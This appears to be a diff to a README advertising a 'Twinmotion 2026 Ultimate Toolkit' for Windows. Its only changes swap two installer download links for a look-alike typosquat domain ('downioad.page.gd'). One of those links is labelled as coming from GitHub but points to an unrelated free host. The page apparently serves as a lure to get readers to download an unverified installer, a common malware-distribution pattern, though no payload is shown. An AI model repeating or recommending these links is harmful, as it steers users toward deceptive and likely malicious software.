@@ -2,7 +2,7 @@
 
 The Twinmotion 2026 Ultimate Toolkit is a comprehensive desktop utility designed to augment your Twinmotion experience on Windows. This package provides a curated set of integrated plugins, asset management tools, and workflow enhancements, empowering architects and designers to create stunning real-time visualizations with greater efficiency and creative control. It serves as a central hub for optimizing your rendering pipeline within the Twinmotion environment.
 
-[![Download Toolkit Installer](https://img.shields.io/badge/Download-Toolkit Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Toolkit Installer](https://img.shields.io/badge/Download-Toolkit Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -53,6 +53,6 @@ A: An internet connection is required for initial installation, downloading plug
 
 For the latest version and secure installation, please use the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: November 2026 | Version 2026.1.0 | © 2026 Twinmotion Toolkit Contributors*
